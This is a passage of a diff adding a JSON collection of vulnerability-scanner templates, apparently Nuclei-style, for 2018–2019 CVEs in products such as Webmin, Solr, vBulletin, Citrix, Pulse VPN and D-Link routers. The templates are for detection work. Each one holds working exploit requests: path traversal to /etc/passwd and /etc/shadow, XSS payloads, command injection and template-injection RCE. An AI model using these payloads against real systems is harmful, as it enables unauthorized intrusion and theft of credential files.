+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "SRC=\"javascript:alert(1337)\">"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%281337%29%22%3E.vm"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-7490",
+      "info": {
+        "author": "madrobot",
+        "name": "uWSGI PHP Plugin Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-1010287",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Timesheet 1.5.3 - Cross Site Scripting",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "><script>javascript:alert(document.domain)</script>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /timesheet/login.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 91\nDNT: 1\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\n\nusername=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscript%3E&password=pd&submit=Login\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-10475",
+      "info": {
+        "author": "madrobot",
+        "name": "Jenkins build-metrics plugin 1.3 - 'label' Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<svg/onload=alert(1337)>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plugin/build-metrics/getBuildStats?label=%22%3E%3Csvg%2Fonload%3Dalert(1337)%3E&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-11043",
+      "info": {
+        "author": "geeknik",
+        "description": "https://github.com/neex/phuip-fpizdam",
+        "name": "PHP-FPM & nginx RCE",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "/bin/which"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?a=/bin/sh+-c+'which+which'&"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-11248",
+      "info": {
+        "author": 52971,
+        "name": "exposed_pprof",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "Types of profiles available:",
+                "Profile Descriptions"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/debug/pprof/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-11510",
+      "info": {
+        "author": "organiccrap",
+        "name": "Pulse Connect Secure SSL VPN arbitrary file read vulnerability",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-11580",
+      "info": {
+        "author": "dwisiswant0",
+        "name": "Atlassian Crowd & Crowd Data Center - Unauthenticated RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "root:*:",
+                "bin:*:"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow",
+            "{{BaseURL}}:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-12314",
+      "info": {
+        "author": "madrobot",
+        "name": "Deltek Maconomy 2.2.5 LFIl",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS//etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-12461",
+      "info": {
+        "author": "pikpikcu",
+        "name": "WebPort 1.19.1 - Reflected Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"</script><script>alert(document.domain);</script><script>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/log?type=%22%3C/script%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3Cscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-12593",
+      "info": {
+        "author": "pikpikcu",
+        "name": "IIceWarp <=10.4.4 - Local File Inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "type": "word",
+              "words": [
+                "[intl]",
+                "root:x:0"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+            "{{BaseURL}}/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc%5cpasswd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-14322",
+      "info": {
+        "author": "madrobot",
+        "name": "Odoo 12.0 - Local File Inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "bit app support",
+                "fonts",
+                "extensions"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/base_import/static/c:/windows/win.ini",
+            "{{BaseURL}}/web/static/c:/windows/win.ini",
+            "{{BaseURL}}/base/static/c:/windows/win.ini"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-14696",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Open-Scool 3.0/Community Edition 2.3 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(document.domain)</script>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?r=students/guardians/create&id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-14974",
+      "info": {
+        "author": "madrobot",
+        "name": "SugarCRM Enterprise 9.0.0 - Cross-Site Scripting",
+        "severity": "low"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "url = window.location.search.split(\"?desktop_url=\")[1]"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/mobile/error-not-supported-platform.html?desktop_url=javascript:alert(1337);//itms://"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-15043",
+      "info": {
+        "author": "bing0o",
+        "name": "Grafana unauthenticated API",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "body": "{\"dashboard\": {\"editable\":false,\"hideControls\":true,\"nav\":[{\"enable\":false,\"type\":\"timepicker\"}],\"rows\": [{}],\"style\":\"dark\",\"tags\":[],\"templating\":{\"list\":[]},\"time\":{},\"timezone\":\"browser\",\"title\":\"Home\",\"version\":5},\"expires\": 3600}",
+          "headers": {
+            "Content-Type": "application/json",
+            "Host": "{{Hostname}}",
+            "User-Agent": "Mozilla/5.0"
+          },
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "deleteKey"
+              ]
+            }
+          ],
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/api/snapshots"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-15107",
+      "info": {
+        "author": "bp0lr",
+        "name": "Webmin <= 1.920 Unauhenticated Remote Command Execution",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /password_change.cgi HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nReferer: https://{{Hostname}}/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 73\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nuser=rootxx&pam=&old=test|cat /etc/passwd&new1=test2&new2=test2&expired=2\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-15858",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "This template supports the detection part only. See references.\n\nadmin/includes/class.import.snippet.php in the \"Woody ad snippets\" plugin\nbefore 2.2.5 for WordPress allows unauthenticated options import,\nas demonstrated by storing an XSS payload for remote code execution.\n\nSource/References:\n- https://github.com/GeneralEG/CVE-2019-15858\n",
+        "name": "Unauthenticated Woody Ad Snippets WordPress Plugin RCE",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "2.2.5"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/insert-php/readme.txt"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-16278",
+      "info": {
+        "author": "pikpikcu",
+        "name": "nostromo 1.9.6 - Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "raw": [
+            "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nContent-Length: 1\nConnection: close\n\necho\necho\ncat /etc/passwd 2>&1\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-1653",
+      "info": {
+        "author": "dwisiswant0",
+        "name": "Unauthenticated Cisco Small Business WAN VPN Routers Sensitive Info Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "sysconfig"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgi-bin/config.exp"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-16662",
+      "info": {
+        "author": "pikpikcu",
+        "name": "rConfig 3.9.2 - Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-16759-1",
+      "info": {
+        "author": "madrobot",
+        "name": "0day RCE in vBulletin v5.0.0-v5.5.4 fix bypass",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "type": "word",
+              "words": [
+                "PHP Version"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nsubWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-16759",
+      "info": {
+        "author": "dwisiswant0",
+        "name": "0day RCE in vBulletin v5.0.0-v5.5.4",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "type": "word",
+              "words": [
+                "nonexistent:1337"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /index.php?routestring=ajax/render/widget_php HTTP/1.1\n\nwidgetConfig[code]=echo%20%27bm9uZXhpc3RlbnQ6MTMzNwo=%27%20|%20base64%20-d;%20exit;\n",
+            "POST / HTTP/1.1\n\n{\"routestring\":\"ajax\\/render\\/widget_php\",\"widgetConfig[code]\":\"echo 'bm9uZXhpc3RlbnQ6MTMzNwo=' | base64 -d; exit;\"}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-16920",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Unauthenticated remote code execution occurs in D-Link products such as DIR-655C, DIR-866L, DIR-652, and DHP-1565. The issue occurs when the attacker sends an arbitrary input to a \"PingTest\" device common gateway interface that could lead to common injection. An attacker who successfully triggers the command injection could achieve full system compromise. Later, it was independently found that these are also affected; DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR-835, and DIR-825.",
+        "name": "Unauthenticated Multiple D-Link Routers RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "or",
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:",
+                "\\[(font|extension|file)s\\]"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /apply_sec.cgi HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded\nConnection: close\nReferer: http://{{Hostname}}/\nUpgrade-Insecure-Requests: 1\n\nhtml_response_page=login_pic.asp&login_name=YWRtaW4%3D&log_pass=&action=do_graph_auth&login_n=admin&tmp_log_pass=&graph_code=&session_id=62384\n",
+            "POST /apply_sec.cgi HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\nContent-Type: application/x-www-form-urlencoded\nConnection: close\nReferer: http://{{Hostname}}/login_pic.asp\nCookie: uid=1234123\nUpgrade-Insecure-Requests: 1\n\nhtml_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{{url_encode('cat /etc/passwd')}}\n",
+            "POST /apply_sec.cgi HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\nContent-Type: application/x-www-form-urlencoded\nConnection: close\nReferer: http://{{Hostname}}/login_pic.asp\nCookie: uid=1234123\nUpgrade-Insecure-Requests: 1\n\nhtml_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{{url_encode('type C:\\\\Windows\\\\win.ini')}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-17382",
+      "info": {
+        "author": "Harsh Bothra",
+        "name": "Zabbix Authentication Bypass",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "type": "word",
+              "words": [
+                "<title>Dashboard</title>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/zabbix.php?action=dashboard.view&dashboardid=1"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-17558",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Apache Solr 8.3.0 - Remote Code Execution via Velocity Template",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /solr/atom/config HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nConnection: close\nContent-Type: application/json\nContent-Length: 259\nUpgrade-Insecure-Requests: 1\n\n{\n    \"update-queryresponsewriter\": {\n      \"startup\": \"lazy\",\n      \"name\": \"velocity\",\n      \"class\": \"solr.VelocityResponseWriter\",\n      \"template.base.dir\": \"\",\n      \"solr.resource.loader.enabled\": \"true\",\n      \"params.resource.loader.enabled\": \"true\"\n    }\n}\n",
+            "GET /solr/atom/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/etc/passwd%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nConnection: close\nUpgrade-Insecure-Requests: 1\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-18394",
+      "info": {
+        "author": "pdteam - nuclei.projectdiscovery.io",
+        "name": "Openfire Full Read SSRF",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "<h1>Burp Collaborator Server</h1>"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/getFavicon?host=burpcollaborator.net"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-19368",
+      "info": {
+        "author": "madrobot",
+        "name": "Rumpus FTP Web File Manager 8.2.9.1 XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "value=''><sVg/OnLoAD=alert`1337`//'>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Login?!'><sVg/OnLoAD=alert`1337`//"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-19781",
+      "info": {
+        "author": "organiccrap",
+        "name": "Citrix ADC Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "[global]"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/vpn/../vpns/cfg/smb.conf"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-19908",
+      "info": {
+        "author": "madrobot",
+        "name": "phpMyChat-Plus XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(1337)</script>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plus/pass_reset.php?L=english&pmc_username=%22%3E%3Cscript%3Ealert(1337)%3C/script%3E%3C"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-19985",
+      "info": {
+        "author": "KBA@SOGETI_ESEC, madrobot & dwisiswant0",
+        "name": "WordPress Plugin Email Subscribers & Newsletters 4.2.2 - Unauthenticated File Download",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Name",
+                "Email",
+                "Status",
+                "Created On"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "Content-Disposition: attachment; filename=all-contacts.csv;"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin.php?page=download_report&report=users&status=all"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-20141",
+      "info": {
+        "author": "knassar702",
+        "description": "An XSS issue was discovered in the Laborator Neon theme 2.0 for WordPress via the data/autosuggest-remote.php q parameter.\nSource/References:\n- https://knassar7o2.blogspot.com/2019/12/neon-dashboard-cve-2019-20141.html\n",
+        "name": "Neon Dashboard - XSS Reflected",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<img src=x onerror=alert(1)>"
+              ]
+            },
+            {
+              "negative": true,
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/json"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/data/autosuggest-remote.php?q=<img%20src=x%20onerror=alert(1)>",
+            "{{BaseURL}}/admin/data/autosuggest-remote.php?q=<img%20src=x%20onerror=alert(1)>"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-2588",
+      "info": {
+        "author": "madrobot",
+        "name": "Oracle Business Intelligence Path Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "for 16-bit app support"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa&documentId=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini",
+            "{{BaseURL}}:9502/xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa&documentId=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-2725",
+      "info": {
+        "author": "dwisiswant0",
+        "name": "Oracle WebLogic Server - Unauthenticated RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "body": "<?xml version=\"1.0\" encoding=\"UTF-8\" ?> <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ads=\"http://www.w3.org/2005/08/addressing\">\n  <soapenv:Header></soapenv:Header>\n  <soapenv:Body></soapenv:Body>\n</soapenv:Envelope>",
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "soapenv:Envelope"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "X-Powered-By: Servlet"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/_async/AsyncResponseService",
+            "{{BaseURL}}:7001/_async/AsyncResponseService"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-3396",
+      "info": {
+        "author": "Harsh Bothra",
+        "name": "Atlassian Confluence Path Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "type": "word",
+              "words": [
+                "<param-name>contextConfigLocation</param-name>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /rest/tinymce/1/macro/preview HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nReferer: {{Hostname}}\nContent-Length: 168\nConnection: close\n\n{\"contentId\":\"786457\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.viddler.com/v/23464dc5\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\"../web.xml\"}}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-3402",
+      "info": {
+        "author": "pdteam",
+        "description": "The ConfigurePortalPages.jspa resource in Jira before version 7.13.3 and from version 8.0.0 before version 8.1.1 allows remote attackers to inject arbitrary HTML or JavaScript via a cross site scripting (XSS) vulnerability in the searchOwnerUserName parameter.",
+        "name": "Jira - Reflected XSS using searchOwnerUserName parameter.",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(1)</script>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}//secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-3799",
+      "info": {
+        "author": "madrobot",
+        "name": "Spring-Cloud-Config-Server Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
